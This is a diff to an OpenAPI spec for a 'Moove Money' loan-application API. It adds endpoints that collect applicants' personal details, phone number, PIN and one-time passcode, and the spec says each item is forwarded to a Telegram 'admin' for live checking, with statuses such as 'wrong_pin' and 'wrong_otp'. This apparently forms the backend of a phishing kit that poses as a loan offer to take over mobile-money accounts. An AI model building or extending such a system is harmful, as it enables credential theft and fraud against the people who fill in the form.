@@ -3,13 +3,17 @@ info:
   # Do not change the title, if the title changes, the import paths will be broken
   title: Api
   version: 0.1.0
-  description: API specification
+  description: Moove Money Loan Application API
 servers:
   - url: /api
     description: Base API path
 tags:
   - name: health
     description: Health operations
+  - name: loan
+    description: Loan application flow
+  - name: telegram
+    description: Telegram webhook handler
 paths:
   /healthz:
     get:
@@ -24,6 +28,149 @@ paths:
             application/json:
               schema:
                 $ref: "#/components/schemas/HealthStatus"
+
+  /loan/sessions:
+    post:
+      operationId: createLoanSession
+      tags: [loan]
+      summary: Create a loan application session
+      description: Stores all 3 steps of the loan application and returns a session ID
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/LoanApplicationInput"
+      responses:
+        "201":
+          description: Session created
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/LoanSession"
+        "400":
+          description: Validation error
+
+  /loan/sessions/{sessionId}/login:
+    post:
+      operationId: submitLogin
+      tags: [loan]
+      summary: Submit login credentials (phone + PIN)
+      description: Sends all loan data + login to Telegram admin for approval. Returns sessionId and pending status.
+      parameters:
+        - name: sessionId
+          in: path
+          required: true
+          schema:
+            type: string
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/LoginInput"
+      responses:
+        "200":
+          description: Login submitted, awaiting admin approval
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/LoginResponse"
+        "404":
+          description: Session not found
+
+  /loan/sessions/{sessionId}/status:
+    get:
+      operationId: getLoginStatus
+      tags: [loan]
+      summary: Poll for login approval status
+      description: Returns current admin approval status for the login
+      parameters:
+        - name: sessionId
+          in: path
+          required: true
+          schema:
+            type: string
+      responses:
+        "200":
+          description: Current status
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ApprovalStatus"
+        "404":
+          description: Session not found
+
+  /loan/sessions/{sessionId}/otp:
+    post:
+      operationId: submitOtp
+      tags: [loan]
+      summary: Submit OTP code for verification
+      description: Sends OTP to Telegram admin for approval
+      parameters:
+        - name: sessionId
+          in: path
+          required: true
+          schema:
+            type: string
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/OtpInput"
+      responses:
+        "200":
+          description: OTP submitted, awaiting admin verification
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/OtpResponse"
+        "404":
+          description: Session not found
+
+  /loan/sessions/{sessionId}/otp-status:
+    get:
+      operationId: getOtpStatus
+      tags: [loan]
+      summary: Poll for OTP verification status
+      description: Returns current OTP verification status
+      parameters:
+        - name: sessionId
+          in: path
+          required: true
+          schema:
+            type: string
+      responses:
+        "200":
+          description: Current OTP status
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/OtpStatus"
+        "404":
+          description: Session not found
+
+  /telegram/webhook:
+    post:
+      operationId: handleTelegramWebhook
+      tags: [telegram]
+      summary: Handle Telegram bot callback queries
+      description: Processes inline keyboard button presses from admin
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/TelegramWebhookInput"
+      responses:
+        "200":
+          description: Webhook processed
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/TelegramWebhookResponse"
+
 components:
   schemas:
     HealthStatus:
@@ -34,3 +181,135 @@ components:
       required:
         - status
 
+    LoanApplicationInput:
+      type: object
+      required:
+        - loanType
+        - loanAmount
+        - loanTermMonths
+        - loanPurpose
+        - firstName
+        - lastName
+        - phone
+        - employmentStatus
+        - monthlyIncome
+      properties:
+        loanType:
+          type: string
+        loanAmount:
+          type: number
+        loanTermMonths:
+          type: number
+        loanPurpose:
+          type: string
+        firstName:
+          type: string
+        lastName:
+          type: string
+        phone:
+          type: string
+        employmentStatus:
+          type: string
+        monthlyIncome:
+          type: number
+
+    LoanSession:
+      type: object
+      required:
+        - sessionId
+        - status
+      properties:
+        sessionId:
+          type: string
+        status:
+          type: string
+
+    LoginInput:
+      type: object
+      required:
+        - phone
+        - pin
+      properties:
+        phone:
+          type: string
+        pin:
+          type: string
+
+    LoginResponse:
+      type: object
+      required:
+        - sessionId
+        - status
+        - message
+      properties:
+        sessionId:
+          type: string
+        status:
+          type: string
+        message:
+          type: string
+
+    ApprovalStatus:
+      type: object
+      required:
+        - status
+      properties:
+        status:
+          type: string
+          description: "pending | approved | rejected"
+        message:
+          type: ["string", "null"]
+
+    OtpInput:
+      type: object
+      required:
+        - otp
+      properties:
+        otp:
+          type: string
+
+    OtpResponse:
+      type: object
+      required:
+        - sessionId
+        - status
+        - message
+      properties:
+        sessionId:
+          type: string
+        status:
+          type: string
+        message:
+          type: string
+
+    OtpStatus:
+      type: object
+      required:
+        - status
+      properties:
+        status:
+          type: string
+          description: "pending | correct | wrong_pin | wrong_otp"
+        message:
+          type: ["string", "null"]
+
+    TelegramWebhookInput:
+      type: object
+      properties:
+        update_id:
+          type: number
+        callback_query:
+          type: object
+          properties:
+            id:
+              type: string
+            data:
+              type: string
+
+    TelegramWebhookResponse:
+      type: object
+      required:
+        - ok
+      properties:
+        ok:
+          type: boolean
